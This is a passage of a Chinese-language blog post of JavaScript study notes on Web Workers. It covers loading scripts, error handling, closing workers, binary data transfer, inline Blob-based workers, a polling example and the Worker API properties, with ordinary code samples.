<h4 id="2-3-Worker-加载脚本"><a href="#2-3-Worker-加载脚本" class="headerlink" title="2.3 Worker 加载脚本"></a>2.3 Worker 加载脚本</h4><p>Worker 内部如果要加载其他脚本，有一个专门的方法<code>importScripts()</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">importScripts</span>(<span class="string">&#x27;script1.js&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>该方法可以同时加载多个脚本。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">importScripts</span>(<span class="string">&#x27;script1.js&#x27;</span>, <span class="string">&#x27;script2.js&#x27;</span>);</span><br></pre></td></tr></table></figure>



<h4 id="2-4-错误处理"><a href="#2-4-错误处理" class="headerlink" title="2.4 错误处理"></a>2.4 错误处理</h4><p>主线程可以监听 Worker 是否发生错误。如果发生错误，Worker 会触发主线程的<code>error</code>事件。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">worker.<span class="title function_">onerror</span>(<span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>([</span><br><span class="line">    <span class="string">&#x27;ERROR: Line &#x27;</span>, event.<span class="property">lineno</span>, <span class="string">&#x27; in &#x27;</span>, event.<span class="property">filename</span>, <span class="string">&#x27;: &#x27;</span>, event.<span class="property">message</span></span><br><span class="line">  ].<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">worker.<span class="title function_">addEventListener</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>Worker 内部也可以监听<code>error</code>事件。</p>
<h4 id="2-5-关闭-Worker"><a href="#2-5-关闭-Worker" class="headerlink" title="2.5 关闭 Worker"></a>2.5 关闭 Worker</h4><p>使用完毕，为了节省系统资源，必须关闭 Worker。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 主线程</span></span><br><span class="line">worker.<span class="title function_">terminate</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Worker 线程</span></span><br><span class="line">self.<span class="title function_">close</span>();</span><br></pre></td></tr></table></figure>



<h3 id="3、数据通信"><a href="#3、数据通信" class="headerlink" title="3、数据通信"></a>3、数据通信</h3><p>前面说过，主线程与 Worker 之间的通信内容，可以是文本，也可以是对象。需要注意的是，这种通信是拷贝关系，即是传值而不是传址，Worker 对通信内容的修改，不会影响到主线程。事实上，浏览器内部的运行机制是，先将通信内容串行化，然后把串行化后的字符串发给 Worker，后者再将它还原。</p>
<p>主线程与 Worker 之间也可以交换二进制数据，比如 File、Blob、ArrayBuffer 等类型，也可以在线程之间发送。下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 主线程</span></span><br><span class="line"><span class="keyword">var</span> uInt8Array = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">10</span>));</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; uInt8Array.<span class="property">length</span>; ++i) &#123;</span><br><span class="line">  uInt8Array[i] = i * <span class="number">2</span>; <span class="comment">// [0, 2, 4, 6, 8,...]</span></span><br><span class="line">&#125;</span><br><span class="line">worker.<span class="title function_">postMessage</span>(uInt8Array);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Worker 线程</span></span><br><span class="line">self.<span class="property">onmessage</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> uInt8Array = e.<span class="property">data</span>;</span><br><span class="line">  <span class="title function_">postMessage</span>(<span class="string">&#x27;Inside worker.js: uInt8Array.toString() = &#x27;</span> + uInt8Array.<span class="title function_">toString</span>());</span><br><span class="line">  <span class="title function_">postMessage</span>(<span class="string">&#x27;Inside worker.js: uInt8Array.byteLength = &#x27;</span> + uInt8Array.<span class="property">byteLength</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>但是，拷贝方式发送二进制数据，会造成性能问题。比如，主线程向 Worker 发送一个 500MB 文件，默认情况下浏览器会生成一个原文件的拷贝。为了解决这个问题，JavaScript 允许主线程把二进制数据直接转移给子线程，但是一旦转移，主线程就无法再使用这些二进制数据了，这是为了防止出现多个线程同时修改数据的麻烦局面。这种转移数据的方法，叫做<a target="_blank" rel="noopener" href="https://www.w3.org/html/wg/drafts/html/master/infrastructure.html#transferable-objects">Transferable Objects</a>。这使得主线程可以快速把数据交给 Worker，对于影像处理、声音处理、3D 运算等就非常方便了，不会产生性能负担。</p>
<p>如果要直接转移数据的控制权，就要使用下面的写法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Transferable Objects 格式</span></span><br><span class="line">worker.<span class="title function_">postMessage</span>(arrayBuffer, [arrayBuffer]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例子</span></span><br><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">1</span>);</span><br><span class="line">worker.<span class="title function_">postMessage</span>(ab, [ab]);</span><br></pre></td></tr></table></figure>



<h3 id="4、同页面的-Web-Worker"><a href="#4、同页面的-Web-Worker" class="headerlink" title="4、同页面的 Web Worker"></a>4、同页面的 Web Worker</h3><p>通常情况下，Worker 载入的是一个单独的 JavaScript 脚本文件，但是也可以载入与主线程在同一个网页的代码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;worker&quot;</span> <span class="attr">type</span>=<span class="string">&quot;app/worker&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">postMessage</span>(<span class="string">&#x27;some message&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面是一段嵌入网页的脚本，注意必须指定&#96;&#96;标签的<code>type</code>属性是一个浏览器不认识的值，上例是<code>app/worker</code>。</p>
<p>然后，读取这一段嵌入页面的脚本，用 Worker 来处理。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> blob = <span class="keyword">new</span> <span class="title class_">Blob</span>([<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#worker&#x27;</span>).<span class="property">textContent</span>]);</span><br><span class="line"><span class="keyword">var</span> url = <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">createObjectURL</span>(blob);</span><br><span class="line"><span class="keyword">var</span> worker = <span class="keyword">new</span> <span class="title class_">Worker</span>(url);</span><br><span class="line"></span><br><span class="line">worker.<span class="property">onmessage</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="comment">// e.data === &#x27;some message&#x27;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面代码中，先将嵌入网页的脚本代码，转成一个二进制对象，然后为这个二进制对象生成 URL，再让 Worker 加载这个 URL。这样就做到了，主线程和 Worker 的代码都在同一个网页上面。</p>
<h3 id="5、实例：Worker-线程完成轮询"><a href="#5、实例：Worker-线程完成轮询" class="headerlink" title="5、实例：Worker 线程完成轮询"></a>5、实例：Worker 线程完成轮询</h3><p>有时，浏览器需要轮询服务器状态，以便第一时间得知状态改变。这个工作可以放在 Worker 里面。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createWorker</span>(<span class="params">f</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> blob = <span class="keyword">new</span> <span class="title class_">Blob</span>([<span class="string">&#x27;(&#x27;</span> + f.<span class="title function_">toString</span>() + <span class="string">&#x27;)()&#x27;</span>]);</span><br><span class="line">  <span class="keyword">var</span> url = <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">createObjectURL</span>(blob);</span><br><span class="line">  <span class="keyword">var</span> worker = <span class="keyword">new</span> <span class="title class_">Worker</span>(url);</span><br><span class="line">  <span class="keyword">return</span> worker;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pollingWorker = <span class="title function_">createWorker</span>(<span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> cache;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">compare</span>(<span class="params"><span class="keyword">new</span>, old</span>) &#123; ... &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;/my-api-endpoint&#x27;</span>).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> data = res.<span class="title function_">json</span>();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_">compare</span>(data, cache)) &#123;</span><br><span class="line">        cache = data;</span><br><span class="line">        self.<span class="title function_">postMessage</span>(data);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">pollingWorker.<span class="property">onmessage</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// render data</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pollingWorker.<span class="title function_">postMessage</span>(<span class="string">&#x27;init&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，Worker 每秒钟轮询一次数据，然后跟缓存做比较。如果不一致，就说明服务端有了新的变化，因此就要通知主线程。</p>
<h3 id="6、实例：-Worker-新建-Worker"><a href="#6、实例：-Worker-新建-Worker" class="headerlink" title="6、实例： Worker 新建 Worker"></a>6、实例： Worker 新建 Worker</h3><p>Worker 线程内部还能再新建 Worker 线程（目前只有 Firefox 浏览器支持）。下面的例子是将一个计算密集的任务，分配到10个 Worker。</p>
<p>主线程代码如下。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> worker = <span class="keyword">new</span> <span class="title class_">Worker</span>(<span class="string">&#x27;worker.js&#x27;</span>);</span><br><span class="line">worker.<span class="property">onmessage</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">textContent</span> = event.<span class="property">data</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>Worker 线程代码如下。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// worker.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// settings</span></span><br><span class="line"><span class="keyword">var</span> num_workers = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">var</span> items_per_worker = <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// start the workers</span></span><br><span class="line"><span class="keyword">var</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> pending_workers = num_workers;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; num_workers; i += <span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> worker = <span class="keyword">new</span> <span class="title class_">Worker</span>(<span class="string">&#x27;core.js&#x27;</span>);</span><br><span class="line">  worker.<span class="title function_">postMessage</span>(i * items_per_worker);</span><br><span class="line">  worker.<span class="title function_">postMessage</span>((i + <span class="number">1</span>) * items_per_worker);</span><br><span class="line">  worker.<span class="property">onmessage</span> = storeResult;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// handle the results</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">storeResult</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  result += event.<span class="property">data</span>;</span><br><span class="line">  pending_workers -= <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (pending_workers &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="title function_">postMessage</span>(result); <span class="comment">// finished!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，Worker 线程内部新建了10个 Worker 线程，并且依次向这10个 Worker 发送消息，告知了计算的起点和终点。计算任务脚本的代码如下。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// core.js</span></span><br><span class="line"><span class="keyword">var</span> start;</span><br><span class="line">onmessage = getStart;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getStart</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  start = event.<span class="property">data</span>;</span><br><span class="line">  onmessage = getEnd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> end;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getEnd</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  end = event.<span class="property">data</span>;</span><br><span class="line">  onmessage = <span class="literal">null</span>;</span><br><span class="line">  <span class="title function_">work</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">work</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = start; i &lt; end; i += <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// perform some complex calculation here</span></span><br><span class="line">    result += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">postMessage</span>(result);</span><br><span class="line">  <span class="title function_">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="7、API"><a href="#7、API" class="headerlink" title="7、API"></a>7、API</h3><h4 id="7-1-主线程"><a href="#7-1-主线程" class="headerlink" title="7.1 主线程"></a>7.1 主线程</h4><p>浏览器原生提供<code>Worker()</code>构造函数，用来供主线程生成 Worker 线程。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myWorker = <span class="keyword">new</span> <span class="title class_">Worker</span>(jsUrl, options);</span><br></pre></td></tr></table></figure>

<p><code>Worker()</code>构造函数，可以接受两个参数。第一个参数是脚本的网址（必须遵守同源政策），该参数是必需的，且只能加载 JS 脚本，否则会报错。第二个参数是配置对象，该对象可选。它的一个作用就是指定 Worker 的名称，用来区分多个 Worker 线程。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 主线程</span></span><br><span class="line"><span class="keyword">var</span> myWorker = <span class="keyword">new</span> <span class="title class_">Worker</span>(<span class="string">&#x27;worker.js&#x27;</span>, &#123; name : <span class="string">&#x27;myWorker&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Worker 线程</span></span><br><span class="line">self.<span class="property">name</span> <span class="comment">// myWorker</span></span><br></pre></td></tr></table></figure>

<p><code>Worker()</code>构造函数返回一个 Worker 线程对象，用来供主线程操作 Worker。Worker 线程对象的属性和方法如下。</p>
<ul>
<li>Worker.onerror：指定 error 事件的监听函数。</li>
<li>Worker.onmessage：指定 message 事件的监听函数，发送过来的数据在<code>Event.data</code>属性中。</li>
<li>Worker.onmessageerror：指定 messageerror 事件的监听函数。发送的数据无法序列化成字符串时，会触发这个事件。</li>
<li>Worker.postMessage()：向 Worker 线程发送消息。</li>
<li>Worker.terminate()：立即终止 Worker 线程。</li>
</ul>
<h4 id="7-2-Worker-线程"><a href="#7-2-Worker-线程" class="headerlink" title="7.2 Worker 线程"></a>7.2 Worker 线程</h4><p>Web Worker 有自己的全局对象，不是主线程的<code>window</code>，而是一个专门为 Worker 定制的全局对象。因此定义在<code>window</code>上面的对象和方法不是全部都可以使用。</p>
<p>Worker 线程有一些自己的全局属性和方法。</p>
<ul>
<li>self.name： Worker 的名字。该属性只读，由构造函数指定。</li>
<li>self.onmessage：指定<code>message</code>事件的监听函数。</li>
<li>self.onmessageerror：指定 messageerror 事件的监听函数。发送的数据无法序列化成字符串时，会触发这个事件。</li>
<li>self.close()：关闭 Worker 线程。</li>
<li>self.postMessage()：向产生这个 Worker 线程发送消息。</li>
<li>self.importScripts()：加载 JS 脚本。</li>
</ul>
<p>（完）</p>
<h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><p>学习文档：<a target="_blank" rel="noopener" href="https://wangdoc.com/javascript/">https://wangdoc.com/javascript/</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/pages/bab4930124ad2c10" data-id="cm2n1iut2000w9sr3c0mh9pay" data-title="浏览器模型" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/15/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="page-number" href="/page/15/">15</a><span class="page-number current">16</span>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E3%80%8AES6-%E6%95%99%E7%A8%8B%E3%80%8B%E7%AC%94%E8%AE%B0/">《ES6 教程》笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E3%80%8AJavaScript%E6%95%99%E7%A8%8B%E3%80%8B%E7%AC%94%E8%AE%B0/">《JavaScript教程》笔记</a></li></ul>
    </div>
  </div>


  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/10/24/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2024/10/11/JavaScript%E6%B7%B1%E5%85%A5%E4%B9%8Bnew%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/11/JavaScript%E6%B7%B1%E5%85%A5%E4%B9%8Bcall%E5%92%8Capply%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/11/JavaScript%E6%B7%B1%E5%85%A5%E4%B9%8Bbind%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/10/11/JavaScript%E6%B7%B1%E5%85%A5%E4%B9%8B%E4%BD%9C%E7%94%A8%E5%9F%9F%E9%93%BE/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>